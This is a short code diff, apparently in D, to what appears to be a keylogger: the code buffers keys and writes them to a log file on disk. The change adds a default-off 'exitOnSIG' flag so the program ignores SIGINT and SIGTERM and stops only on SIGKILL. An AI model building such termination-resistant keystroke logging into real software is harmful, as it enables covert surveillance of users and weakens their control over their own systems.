@@ -37,6 +37,10 @@ string[] keyBuffer;
 // The max size of the key buffer before being written to disk
 int maxKeyBufferLength = 100;
 
+// If true the prgram will exit if it receives SIGINT or SIGTERM
+// If false the program just keeps running unless SIGKILL is sent
+bool exitOnSIG = false;
+
 void main() {
 	// Our signal handlers
 	signal(SIGINT, &handler);
@@ -60,7 +64,7 @@ void main() {
 			writeLog();
 		}
 		// Check is we should exit
-		if (doQuit) {
+		if (doQuit && exitOnSIG) {
 			break;
 		}
 
